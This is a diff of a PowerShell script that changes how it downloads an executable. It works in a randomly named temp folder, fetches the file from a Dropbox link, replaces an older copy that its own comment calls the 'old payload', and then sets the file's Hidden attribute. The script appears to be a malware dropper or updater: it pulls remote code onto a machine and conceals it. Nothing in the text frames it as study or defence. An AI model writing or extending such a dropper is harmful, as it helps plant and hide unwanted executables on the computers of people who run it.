@@ -5,10 +5,16 @@ start-sleep 5
 cd $env:temp/sVBXKuz
 
 #download new backup
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/36hpp0y42mkwe3rdv9uwc/wsappa-1.4.exe?rlkey=80dozbkw1nrlupsfyx0ff6rms&dl=0" -OutFile wsappa.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/36hpp0y42mkwe3rdv9uwc/wsappa-1.4.exe?rlkey=80dozbkw1nrlupsfyx0ff6rms&dl=0" -OutFile new_wsappa.exe
+
+#remove old payload
+Remove-Item wsappa.exe
 
 #sleep
 start-sleep 2
+
+#change name
+Rename-Item new_wsappa.exe wsappa.exe
 
 # Set "Hidden" attribute on the file
 $filePath = Join-Path $env:temp\sVBXKuz "wsappa.exe"
